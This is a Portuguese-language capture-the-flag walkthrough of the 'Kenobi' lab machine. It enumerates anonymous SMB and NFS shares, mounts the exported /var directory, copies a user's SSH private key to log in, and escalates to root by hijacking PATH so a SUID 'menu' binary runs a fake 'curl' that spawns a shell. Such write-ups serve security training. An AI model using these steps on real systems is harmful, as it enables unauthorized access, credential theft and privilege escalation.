Samba é baseado em SMB.

podemos nos conectar ao share com:
``smbclient //10.10.244.78/anonymous``

baixamos o log.txt com:
``get log.txt``

dentro dele temos uma key ssh e algumas outras informações

usando o npma para enumerar a porta 111 que é um network file system
``nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.244.78``
podemos ver uma pasta ``/var`` com arquivos

``searchsploit proftpd 1.3.5``
usamos o searchsploit para saber quais exploits podem ser usados nessa versão

vamos dar mount no ``/var/tmp``

```
mkdir /mnt/kenobiNFS  
mount 10.10.244.78:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
```

Dar **MOUNT** em um diretório significa montar um sistema de arquivos ou um dispositivo de armazenamento nesse diretório, tornando-o acessível no sistema operacional. Isso é comum em sistemas baseados em Unix/Linux.

Ao fazer isso tornamos a pasta disponivel no servidor nfs disponível dentro da nossa máquina

depois disso foi só copiar a chave rsa do kenobi e logar na conta dele
```
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa # isso aqui serve para dar as permissões corretas pro arquivo para evitar que o ssh não funcione
ssh -i id_rsa kenobi@10.10.244.78
```

Temos acesso agora à conta do kenobi, basta pegar a flag com o cat

usamos ``find / -perm -u=s -type f 2>/dev/null`` para encontrar os arquivos com permissão SUID
achamos um particularmente estranho ``/usr/bin/menu`` ao executar aparece um menu com 3 opções que executam os seguintes comandos:
```
curl -I localhost
uname -r
ifconfig
```

o comando ``strings menu`` mostra que esses 3 comandos não foram configurados com o path absoluto, então podemos mudar o path para que façam o que a gente quiser

utilizando:
```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```
Criamos um comando ``curl`` falso que na verdade abre uma shell. Ao exportar o path o menu abrirá o nosso comando e não o ``curl`` já configurado. Como ``menu`` roda como super usuário, essa shell será de ``root``.

Agora basta pegar a flag com o ``cat``.